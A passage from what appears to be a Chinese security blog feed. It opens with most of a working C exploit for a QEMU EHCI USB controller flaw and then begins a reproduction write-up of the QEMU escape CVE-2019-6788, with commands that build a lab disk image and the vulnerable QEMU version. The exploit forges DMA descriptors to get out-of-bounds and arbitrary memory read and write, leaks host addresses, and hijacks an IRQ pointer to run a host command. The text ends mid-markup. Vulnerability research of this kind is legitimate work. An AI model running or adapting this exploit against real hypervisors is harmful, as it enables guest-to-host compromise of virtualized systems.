class="number">0x66</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    mmio_write(<span class="number">0x67</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span class="number">0x67</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    mmio_write(<span class="number">0x68</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span class="number">0x68</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    mmio_write(<span class="number">0x69</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    mmio_write(<span class="number">0x69</span>&lt;&lt;<span class="number">2</span>,<span class="number">1</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_length</span><span class="params">(<span class="type">uint64_t</span> length)</span>&#123;</span><br><span class="line"></span><br><span class="line">    setup_buf[<span class="number">6</span>] = length &amp; <span class="number">0xff</span>;</span><br><span class="line">    setup_buf[<span class="number">7</span>] = (length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">8</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">2</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(setup_buf);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">perpare_read</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    setup_buf[<span class="number">0</span>] = <span class="number">0x80</span>;</span><br><span class="line">    setup_buf[<span class="number">6</span>] = <span class="number">0xff</span>;</span><br><span class="line">    setup_buf[<span class="number">7</span>] = <span class="number">0x00</span>;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">8</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">2</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(setup_buf);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">perpare_write</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    setup_buf[<span class="number">0</span>] = <span class="number">0x00</span>;</span><br><span class="line">    setup_buf[<span class="number">6</span>] = <span class="number">0xff</span>;</span><br><span class="line">    setup_buf[<span class="number">7</span>] = <span class="number">0x00</span>;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">8</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">2</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(setup_buf);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">oob_read</span><span class="params">(<span class="type">uint64_t</span> length,<span class="type">int</span> flag)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        perpare_read();</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] perpare read finished\033[0m&quot;</span>);</span><br><span class="line">        set_length(length);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] set length finished\033[0m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data_buf[<span class="number">0</span>] = <span class="string">&#x27;R&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">1</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">2</span>] = <span class="string">&#x27;s&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">3</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">4</span>] = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">    data_buf[<span class="number">5</span>] = <span class="string">&#x27;y&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">0x1e00</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(data_buf);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">1</span>] = virtuak_addr_to_physical_addr(data_bufoob);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] oob read start\033[0m&quot;</span>);</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf)); <span class="comment">// periodiclistbase</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">oob_write</span><span class="params">(<span class="type">uint64_t</span> offset,<span class="type">uint64_t</span> setup_len,<span class="type">uint64_t</span> setup_index,<span class="type">int</span> perpare)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(perpare)&#123;</span><br><span class="line">        perpare_write();</span><br><span class="line">        set_length(<span class="number">0x1010</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] prepare write finished\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(data_bufoob + offset) = <span class="number">0x0000000200000002</span>; <span class="comment">// 覆盖成原先的内容</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">int</span> *)(data_bufoob + <span class="number">0x8</span> +offset) = setup_len; <span class="comment">//setup_len</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">int</span> *)(data_bufoob + <span class="number">0xc</span>+ offset) = setup_index;</span><br><span class="line"></span><br><span class="line">    qtd-&gt;token = (<span class="number">0x1e00</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">7</span>) | (<span class="number">0</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">0</span>] = virtuak_addr_to_physical_addr(data_buf);</span><br><span class="line">    qtd-&gt;bufptr[<span class="number">1</span>] = virtuak_addr_to_physical_addr(data_bufoob);</span><br><span class="line"></span><br><span class="line">    qh-&gt;token = <span class="number">1</span> &lt;&lt; <span class="number">7</span>;</span><br><span class="line">    qh-&gt;current_qtd = virtuak_addr_to_physical_addr(qtd);</span><br><span class="line"></span><br><span class="line">    *entry = virtuak_addr_to_physical_addr(qh) + (<span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    set_usbcmd();</span><br><span class="line">    set_portsc();</span><br><span class="line">    mmio_write(<span class="number">0x34</span>,virtuak_addr_to_physical_addr(dmabuf));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">anywhere_read</span><span class="params">(<span class="type">uint64_t</span> target_addr)</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] Anywhere Read\033[0m&quot;</span>);</span><br><span class="line">    <span class="comment">//set_length(0x1010);</span></span><br><span class="line">    oob_write(<span class="number">0x0</span>,<span class="number">0x1010</span>,<span class="number">0xfffffff8</span><span class="number">-0x1010</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf) = <span class="number">0x2000000000000080</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> target_offset = target_addr - data_buf_addr;</span><br><span class="line"></span><br><span class="line">    oob_write(<span class="number">0x8</span>,<span class="number">0xffff</span>,target_offset - <span class="number">0x1018</span>,<span class="number">0</span>);</span><br><span class="line">    oob_read(<span class="number">0x2000</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">anywhere_write</span><span class="params">(<span class="type">uint64_t</span> target_addr,<span class="type">uint64_t</span> payload,<span class="type">int</span> flag)</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] Anywhere Write\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> offset = target_addr - data_buf_addr;</span><br><span class="line"></span><br><span class="line">    oob_write(<span class="number">0</span>, offset+<span class="number">0x8</span>, offset<span class="number">-0x1010</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[41;37m[*] Hacked!\033[0m\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf) = payload;</span><br><span class="line">    oob_write(<span class="number">0</span>, <span class="number">0xffff</span>, <span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd &lt; <span class="number">0</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    dmabuf = mmap(<span class="number">0</span>, <span class="number">0x3000</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (dmabuf == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mlock(dmabuf, <span class="number">0x3000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//printf(&quot;[*] mmio_mem : %p\n&quot;, mmio_mem);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] dmabuf : %p\n&quot;</span>,dmabuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] phy dmabuf : %p\n&quot;</span>,virtuak_addr_to_physical_addr(dmabuf));</span><br><span class="line"></span><br><span class="line">    entry = dmabuf + <span class="number">0x4</span>;</span><br><span class="line">    qh = dmabuf + <span class="number">0x100</span>;</span><br><span class="line">    qtd = dmabuf + <span class="number">0x200</span>;</span><br><span class="line">    setup_buf = dmabuf + <span class="number">0x300</span>;</span><br><span class="line">    data_buf = dmabuf + <span class="number">0x1000</span>;</span><br><span class="line">    data_bufoob = dmabuf + <span class="number">0x2000</span>;</span><br><span class="line">    first_leak_data = dmabuf + <span class="number">0x2000</span>;</span><br><span class="line">    second_leak_data = dmabuf + <span class="number">0x1000</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[41;37m[*] Beginning\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[47;31m[*] Wait a moment\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[41;37m[*] Step 1/3\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line">    oob_read(<span class="number">0x2000</span>,<span class="number">1</span>);</span><br><span class="line">    device_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">36</span>;i&lt;<span class="number">42</span>;i++)&#123;</span><br><span class="line">        <span class="type">uint64_t</span> tmp = first_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">        device_addr |= tmp &lt;&lt; ((i<span class="number">-36</span>) * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    func_addr = <span class="number">0</span>;</span><br><span class="line">    port_addr = device_addr+<span class="number">0x78</span>;</span><br><span class="line">    data_buf_addr = device_addr+<span class="number">0xdc</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Devices addr : 0x%lx\033[0m\n&quot;</span>,device_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Port addr : 0x%lx\033[0m\n&quot;</span>,port_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Data Buf addr : 0x%lx\033[0m\n&quot;</span>,data_buf_addr);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0x4fc</span>;i&lt;<span class="number">0x4fc</span>+<span class="number">6</span>;i++)&#123;</span><br><span class="line">        <span class="type">uint64_t</span> tmp = first_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">        func_addr |= tmp &lt;&lt; ((i<span class="number">-0x4fc</span>) * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// proc_base = func_addr - 0x1069490;</span></span><br><span class="line">    proc_base = func_addr - <span class="number">0x106b170</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Func addr : 0x%lx\033[0m\n&quot;</span>,func_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] proc base : 0x%lx\033[0m\n&quot;</span>,proc_base);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//uint64_t system_addr = func_addr - 0xb5c860;</span></span><br><span class="line">    <span class="comment">//  uint64_t system_addr = proc_base + 0x2BE010;</span></span><br><span class="line">    <span class="type">uint64_t</span> system_addr = proc_base + <span class="number">0x2BE960</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] System addr : 0x%lx\033[0m\n&quot;</span>,system_addr);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[41;37m[*] Step 2/3\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    anywhere_read(port_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        <span class="type">uint64_t</span> tmp = second_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">        port_ptr |= tmp &lt;&lt; ((i) * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] port ptr : 0x%lx\033[0m\n&quot;</span>,port_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// uint64_t EHCIState_addr = port_ptr - 0x530;</span></span><br><span class="line">    <span class="type">uint64_t</span> EHCIState_addr = port_ptr - <span class="number">0x540</span>;</span><br><span class="line">    <span class="comment">// uint64_t irq_addr = EHCIState_addr + 0xb8;</span></span><br><span class="line">    <span class="type">uint64_t</span> irq_addr = EHCIState_addr + <span class="number">0xc0</span>;</span><br><span class="line">    <span class="type">uint64_t</span> fake_irq_addr = data_buf_addr;</span><br><span class="line">    <span class="type">uint64_t</span> irq_ptr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    anywhere_read(irq_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        <span class="type">uint64_t</span> tmp = second_leak_data[i] &amp; <span class="number">0xff</span>;</span><br><span class="line">        irq_ptr |= tmp &lt;&lt; ((i) * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Port ptr : 0x%lx\033[0m\n&quot;</span>,port_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] EHCIState addr : 0x%lx\033[0m\n&quot;</span>,EHCIState_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] IRQ addr : 0x%lx\033[0m\n&quot;</span>,irq_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] Fake IRQ addr : 0x%lx\033[0m\n&quot;</span>,fake_irq_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[47;31m[*] IRQ ptr : 0x%lx\033[0m\n&quot;</span>,irq_ptr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf + <span class="number">0x28</span>) = system_addr;</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf + <span class="number">0x30</span>) = device_addr+<span class="number">0xdc</span>+<span class="number">0x100</span>;</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)(data_buf + <span class="number">0x38</span>) = <span class="number">0x3</span>;</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(data_buf + <span class="number">0x100</span>) = <span class="number">0x67616c6620746163</span>; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[41;37m[*] Step 3/3\033[0m\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    oob_write(<span class="number">0</span>, <span class="number">0xffff</span>, <span class="number">0xffff</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    anywhere_write(irq_addr, fake_irq_addr,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-6788-Qemu逃逸漏洞复现-分析</title>
      <link href="/posts/882088222.html"/>
      <url>/posts/882088222.html</url>
      
        <content type="html"><![CDATA[<p><code>CVE-2019-6788</code>是一个<code>qemu</code>的逃逸漏洞，本文参考<a href="https://ama2in9.top/2021/01/02/cve-2019-6788/#more">xmzyshypnc</a>和<a href="https://ray-cp.github.io/archivers/qemu-pwn-cve-2019-6788%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">raycp</a>的文章</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先是创建<code>qemu</code>启动所用的文件系统，需要安装<code>debootstrap</code>，创建完成后的文件系统带有<code>ssh</code>，<code>ssh/id_rsa</code>为私钥。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> qemu</span><br><span class="line"></span><br><span class="line">sudo debootstrap --include=openssh-server,curl,tar,gcc,\</span><br><span class="line">libc6-dev,time,strace,sudo,less,psmisc,\</span><br><span class="line">selinux-utils,policycoreutils,checkpolicy,selinux-policy-default \</span><br><span class="line">stretch qemu</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -eux</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Set some defaults and enable promtless ssh to the machine for root.</span></span><br><span class="line">sudo sed -i <span class="string">&#x27;/^root/ &#123; s/:x:/::/ &#125;&#x27;</span> qemu/etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100&#x27;</span> | sudo <span class="built_in">tee</span> -a qemu/etc/inittab</span><br><span class="line"><span class="comment">#printf &#x27;\nauto enp0s3\niface enp0s3 inet dhcp\n&#x27; | sudo tee -a qemu/etc/network/interfaces</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;\nallow-hotplug enp0s3\niface enp0s3 inet dhcp\n&#x27;</span> | sudo <span class="built_in">tee</span> -a qemu/etc/network/interfaces</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;debugfs /sys/kernel/debug debugfs defaults 0 0&#x27;</span> | sudo <span class="built_in">tee</span> -a qemu/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;kernel.printk = 7 4 1 3&quot;</span> | sudo <span class="built_in">tee</span> -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;debug.exception-trace = 0&#x27;</span> | sudo <span class="built_in">tee</span> -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;net.core.bpf_jit_enable = 1&quot;</span> | sudo <span class="built_in">tee</span> -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;net.core.bpf_jit_harden = 2&quot;</span> | sudo <span class="built_in">tee</span> -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;net.ipv4.ping_group_range = 0 65535&quot;</span> | sudo <span class="built_in">tee</span> -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">&quot;127.0.0.1\tlocalhost\n&quot;</span> | sudo <span class="built_in">tee</span> qemu/etc/hosts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nameserver 8.8.8.8&quot;</span> | sudo <span class="built_in">tee</span> -a qemu/etc/resolve.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ubuntu&quot;</span> | sudo <span class="built_in">tee</span> qemu/etc/hostname</span><br><span class="line">sudo <span class="built_in">mkdir</span> -p qemu/root/.ssh/</span><br><span class="line"><span class="built_in">rm</span> -rf ssh</span><br><span class="line"><span class="built_in">mkdir</span> -p ssh</span><br><span class="line">ssh-keygen -f ssh/id_rsa -t rsa -N <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">cat</span> ssh/id_rsa.pub | sudo <span class="built_in">tee</span> qemu/root/.ssh/authorized_keys</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Build a disk image</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=qemu.img bs=1M seek=2047 count=1</span><br><span class="line">sudo mkfs.ext4 -F qemu.img</span><br><span class="line">sudo <span class="built_in">mkdir</span> -p /mnt/qemu</span><br><span class="line">sudo mount -o loop qemu.img /mnt/qemu</span><br><span class="line">sudo <span class="built_in">cp</span> -a qemu/. /mnt/qemu/.</span><br><span class="line">sudo umount /mnt/qemu</span><br></pre></td></tr></table></figure><p>接着是带有漏洞的<code>qemu</code>的编译，也就是首先下载<code>qemu</code>源码，然后切换到有漏洞的版本，再进行编译。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://git.qemu-project.org/qemu.git</span><br><span class="line"><span class="built_in">cd</span> qemu</span><br><span class="line">git checkout tags/v3.1.0</span><br><span class="line"><span class="built_in">mkdir</span> -p bin/debug/naive</span><br><span class="line"><span class="built_in">cd</span> bin/debug/naive</span><br><span class="line">../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>编译出来的为<code>./qemu/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64</code>，查看一下版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  qemu ./qemu/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64 -version</span><br><span class="line">QEMU emulator version 3.1.0 (v3.1.0-dirty)</span><br><span class="line">Copyright (c) 2003-2018 Fabrice Bellard and the QEMU Project developers</span><br></pre></td></tr></table></figure><p>内核可以自行编译，代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="comment">//cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.2.11.tar.xz -O linux-5.2.11.tar.xz</span></span><br><span class="line">tar -xvf linux<span class="number">-5.2</span><span class="number">.11</span>.tar.xz</span><br><span class="line">make defconfig</span><br><span class="line">make kvmconfig</span><br><span class="line">#编辑 .config 文件， 将 CONFIG_8139CP=y 和 CONFIG_PCNET32=y 打开</span><br><span class="line">make -j4</span><br></pre></td></tr></table></figure><p>需要保证下面的两个选项是开启的，否则启动的时候可能会出现网卡启动错误，因为对应的网卡驱动没有编译进去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_8139CP=y  , rtl8139 驱动</span><br><span class="line">CONFIG_PCNET32=y , pcnet 驱动</span><br></pre></td></tr></table></figure><p>这里我是直接采用之前比赛中的内核。启动脚本如下</p><figure 